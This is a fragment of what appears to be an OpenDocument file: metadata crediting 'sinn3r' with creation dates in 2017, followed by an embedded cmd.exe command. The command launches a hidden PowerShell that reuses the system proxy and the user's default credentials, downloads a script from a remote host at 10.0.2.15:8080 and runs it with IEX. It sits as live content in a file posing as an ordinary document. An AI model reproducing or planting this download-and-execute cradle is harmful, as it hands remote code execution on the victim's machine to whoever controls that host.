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n3r </meta:initial-creator>
    <meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date>
    <dc:date>2017-02-06T15:21:59.64</dc:date>
    <dc:creator>sinn3r </dc:creator>
    <meta:editing-duration>PT4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cmd.exe /C ""powershell.exe -nop -w hidden -c $m=new-object net.webclient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){$m.proxy=[Net.WebRequest]::GetSystemWebProxy();$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;};IEX ((new-object Net.WebClient).DownloadString('http://10.0.2.15:8080/aGQOoiXWBXmvV'));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